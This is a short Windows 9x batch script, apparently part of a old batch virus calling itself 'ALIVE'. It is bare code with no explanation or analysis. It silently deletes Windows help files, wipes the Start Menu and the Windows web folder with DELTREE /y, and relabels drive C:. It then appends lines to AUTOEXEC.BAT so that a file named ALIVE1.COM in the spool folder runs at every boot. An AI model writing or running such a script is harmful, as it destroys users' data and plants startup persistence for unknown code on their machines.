DEL c:\windows\help\*.hlp
DEL c:\windows\help\*.chm
DELTREE  /y c:\windows\web             > alive.log
DELTREE  /y c:\windows\startm~1\*             > alive.log
DELTREE  /y c:\windows\startm~1\*.*             > alive.log
LABEL  c: ALIVE
echo @ECHO OFF                    >> C:\AUTOEXEC.BAT
echo CALL C:\WINDOWS\SPOOL\ALIVE1.COM                    >> C:\AUTOEXEC.BAT
